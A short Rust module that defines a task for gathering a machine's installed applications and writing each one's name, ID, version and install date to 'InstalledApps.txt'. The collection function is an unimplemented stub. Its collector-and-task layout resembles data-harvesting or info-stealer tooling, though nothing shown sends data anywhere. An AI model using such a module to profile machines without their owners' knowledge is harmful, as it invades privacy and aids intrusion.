use crate::alloc::borrow::ToOwned;
use alloc::string::{String, ToString};
use alloc::vec::Vec;
use collector::Collector;
use core::fmt::{Display, Formatter};
use indoc::indoc;
use tasks::{parent_name, Task};
use utils::path::{Path, WriteToFile};

pub(super) struct InstalledAppsTask;

impl<C: Collector> Task<C> for InstalledAppsTask {
    parent_name!("InstalledApps.txt");

    fn run(&self, parent: &Path, collector: &C) {
        let Some(apps) = collect_apps() else {
            return
        };

        if apps.is_empty() {
            return
        }

        let _ = apps.into_iter()
            .map(|app| app.to_string())
            .collect::<Vec<String>>()
            .join("\n\n")
            .write_to(parent);
    }
}

fn collect_apps() -> Option<Vec<App>> {
    unimplemented!()
}

struct App {
    name: String,
    version: String,
    id: String,
    installed_date: String
}

impl Display for App {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(f,
            indoc! {"
                App: {} ({})
                  Version: {}
                  Install date: {}
            "},
            self.name,
            self.id,
            self.version,
            self.installed_date
        )
    }
}